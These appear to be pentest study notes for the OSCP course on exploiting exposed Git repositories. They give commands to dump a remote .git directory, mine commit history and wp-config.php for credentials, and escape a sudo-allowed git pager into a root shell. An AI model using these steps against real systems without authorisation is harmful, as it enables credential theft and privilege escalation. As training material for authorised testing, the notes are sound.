# Git Exposed → Credential Chain

## A. Externally exposed `.git`

```bash
curl http://<TARGET>/.git/HEAD       # confirm exposed
git-dumper http://<TARGET>/.git ./repo
cd repo
git log --oneline
git show <COMMIT_HASH>              # deleted creds often here
git diff HEAD~1 HEAD
```

Look for deleted config files, deployment scripts, API keys, passwords, internal hostnames, and old credentials.

---

## B. Local Git repository after foothold / privilege escalation

PEN-200 Chapter 24 shows the same idea **after** obtaining shell access: a web application directory was also a Git repository, and old commits exposed a deleted staging script containing reusable credentials.

First hunt configuration files for immediate secrets:

```bash
find / -name wp-config.php 2>/dev/null
cat /path/to/wp-config.php
```

Typical high-value values:

```text
DB_USER
DB_PASSWORD
DB_HOST
```

Then look for repositories:

```bash
find / -type d -name .git 2>/dev/null
```

If the repository is readable only as root but you have a sudo-able Git binary, remember that **Git itself may be both a privesc vector and a way to inspect the protected repository**.

### Sudo Git → pager escape

Check:

```bash
sudo -l
```

If you have something like:

```text
(ALL) NOPASSWD: /usr/bin/git
```

one Chapter 24 / GTFOBins path is:

```bash
sudo git -p help config
```

Inside the pager (`less`), execute:

```text
!/bin/bash
```

Confirm:

```bash
whoami
```

> [!note]
> A `PAGER=... sudo git ...` variant may fail when sudo forbids setting that environment variable. The pager escape avoids relying on that variable.

---

## Inspect history without breaking the application

```bash
cd <REPO>
git status
git log --oneline --decorate
git show <COMMIT_HASH>
git diff <OLDER_COMMIT> <NEWER_COMMIT>
```

Prefer `git show` / `git diff` to inspect old content. **Do not casually `git checkout` an old commit on a live target**, because changing the working tree can disrupt the application.

Look especially for commits/messages such as:

```text
removed staging script
removed internal network access
removed credentials
initial deployment
backup config
```

Deleted scripts may expose automation secrets such as:

```text
sshpass -p '<PASSWORD>' rsync <USER>@<INTERNAL_HOST>:/path/ /local/path/
```

That single line can reveal:

- a reusable username/password
- an internal hostname/IP
- a previously reachable staging server
- a new service/protocol to test

---

## After root: enumerate again

PEN-200 explicitly recommends running local enumeration again after gaining privileged access because new files and secrets may now be readable.

```bash
./linpeas.sh
```

Then update your credential/host notes and validate the newly recovered identity against other services.

Related: [[Methodology/Assembling the Pieces — End-to-End OSCP Attack Chain|Assembling the Pieces]] · [[Active Directory/After-escalation-before-movement|After escalation before movement]]
